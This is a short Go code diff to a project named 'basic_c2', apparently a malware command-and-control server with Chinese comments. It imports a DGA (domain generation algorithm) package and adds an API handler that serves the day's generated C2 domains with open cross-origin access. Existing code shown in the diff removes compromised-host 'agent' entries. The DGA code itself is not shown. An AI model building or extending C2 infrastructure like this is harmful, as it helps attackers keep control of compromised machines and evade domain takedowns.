@@ -3,6 +3,7 @@ package handlers
 import (
 	"basic_c2/internal/config"
 	"basic_c2/internal/crypto"
+	"basic_c2/internal/dga"
 	"basic_c2/internal/models"
 	"basic_c2/server/storage"
 	"encoding/json"
@@ -138,4 +139,20 @@ func (h *Handler) DeleteAgent(w http.ResponseWriter, r *http.Request) {
 	
 	fmt.Printf("[-] 主机已移除: %s\n", id)
 	fmt.Fprintf(w, "deleted")
+}
+
+// [新增] 获取今日 DGA 域名
+func ApiGetCurrentDGA(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+
+	// 生成当天的 3 个域名
+	domains := dga.GenerateDomains(config.DGACount)
+
+	response := map[string]interface{}{
+		"date":    time.Now().Format("2006-01-02"),
+		"domains": domains, // 返回数组 ["https://...", "https://...", "https://..."]
+	}
+
+	json.NewEncoder(w).Encode(response)
 }
